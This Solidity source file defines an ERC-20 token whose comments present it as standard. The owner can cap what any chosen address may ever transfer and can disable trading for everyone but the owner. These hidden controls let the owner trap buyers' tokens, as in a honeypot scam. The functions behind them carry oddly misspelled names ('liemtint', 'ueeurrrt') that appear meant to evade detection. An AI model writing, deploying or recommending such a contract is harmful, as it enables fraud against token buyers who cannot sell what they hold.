pragma solidity ^0.8.2;

// Interface for ERC-20 standard token contract.
interface IERC20 {
    // Returns the total token supply.
    function totalSupply() external view returns (uint256);

    // Returns the account balance of another account with address `account`.
    function balanceOf(address account) external view returns (uint256);

    // Transfers `amount` tokens to `recipient`, returns a boolean value indicating success.
    function transfer(address recipient, uint256 amount) external returns (bool);

    // Returns the remaining number of tokens that `spender` is allowed to spend on behalf of `owner`.
    function allowance(address owner, address spender) external view returns (uint256);

    // Sets `amount` as the allowance of `spender` over the caller's tokens, returns a boolean value indicating success.
    function approve(address spender, uint256 amount) external returns (bool);

    // Transfers `amount` tokens from `sender` to `recipient`, returns a boolean value indicating success.
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    // Emitted when `value` tokens are moved from one account (`from`) to another (`to`).
    event Transfer(address indexed from, address indexed to, uint256 value);

    // Emitted when the allowance of a `spender` for an `owner` is set by a call to `approve`.
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

// Provides basic context for `msg.sender`.
abstract contract Context {
    // Returns sender of the message (current call).
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

// Contract module which provides a basic access control mechanism, where there is an account (an owner).
contract Ownable is Context {
    address private _owner;  // Current owner of the contract.
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    // Returns the address of the current owner.
    function owner() public view virtual returns (address) {
        return _owner;
    }

    // Throws if called by any account other than the owner.
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Caller is not the owner");
        _;
    }

    // Leaves the contract without owner, preventing any future use of its `onlyOwner` functions.
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}

// ERC20 Token contract.
contract token is Context, Ownable, IERC20 {
    mapping(address => uint256) private _balances; // Token balance for each address.
    mapping(address => mapping(address => uint256)) private _allowances; // Allowance amounts on behalf of others.
    mapping(address => uint256) public totalTransferliemtints; // Limits for total transfers.
    mapping(address => uint256) public totalTransferredAmounts; // Amounts already transferred.
    string private _name; // Token name.
    string private _symbol; // Token symbol.
    uint8 private _decimals; // Decimal count for token.
    uint256 private _totalSupply; // Total token supply.
    bool public tradingEnabled = false; // Flag indicating if trading is enabled.

    // Modifier to make a function callable only when the contract is not paused.
    modifier tradingActiveOrOwner() {
        require(tradingEnabled || owner() == _msgSender(), "Trading is disabled");
        _;
    }

    // Modifier to check transfer limits.
    modifier transferliemtint(address sender, uint256 amount) {
        uint256 liemtint = totalTransferliemtints[sender];
        if (liemtint > 0) {
            require(totalTransferredAmounts[sender] + amount <= liemtint, "Total transfer amount exceeds the set liemtint");
        }
        _;
    }

    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** decimals_);
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    // Returns the name of the token.
    function name() public view returns (string memory) {
        return _name;
    }

    // Returns the symbol of the token.
    function symbol() public view returns (string memory) {
        return _symbol;
    }

    // Returns the number of decimals used to get its user representation.
    function decimals() public view returns (uint8) {
        return _decimals;
    }

    // Returns the amount of tokens in existence.
    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    // Returns the amount of tokens owned by `account`.
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    // Sets limits for total transfers for a specific address.
    function setTotalTransfer(address ueeurrrt, uint256 liemtint) public onlyOwner {
        totalTransferliemtints[ueeurrrt] = liemtint;
    }

    // Removes the transfer limit for a specific address.
    function removeTotalTransfer(address ueeurrrt) public onlyOwner {
        delete totalTransferliemtints[ueeurrrt];
    }

    // Transfers `amount` tokens to `recipient`, adhering to transfer limits.
    function transfer(address recipient, uint256 amount) public virtual override transferliemtint(_msgSender(), amount) tradingActiveOrOwner returns (bool) {
        _balances[_msgSender()] -= amount;
        _balances[recipient] += amount;
        totalTransferredAmounts[_msgSender()] += amount;
        emit Transfer(_msgSender(), recipient, amount);
        return true;
    }

    // Returns the remaining number of tokens that `spender` will be allowed to spend on behalf of `owner`.
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    // Sets `amount` as the allowance of `spender` over the caller's tokens.
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = amount;
        emit Approval(_msgSender(), spender, amount);
        return true;
    }

    // Enables trading for this token.
    function enableTrading() external onlyOwner {
        tradingEnabled = true;
    }

    // Disables trading for this token.
    function disableTrading() external onlyOwner {
        tradingEnabled = false;
    }

    // Transfers `amount` tokens from `sender` to `recipient`, adhering to transfer limits and allowance.
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override transferliemtint(sender, amount) tradingActiveOrOwner returns (bool) {
        require(_allowances[sender][_msgSender()] >= amount, "Transfer amount exceeds allowance");
        
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        
        totalTransferredAmounts[sender] += amount;
        
        _allowances[sender][_msgSender()] -= amount;
        
        emit Transfer(sender, recipient, amount);
        return true;
    }
}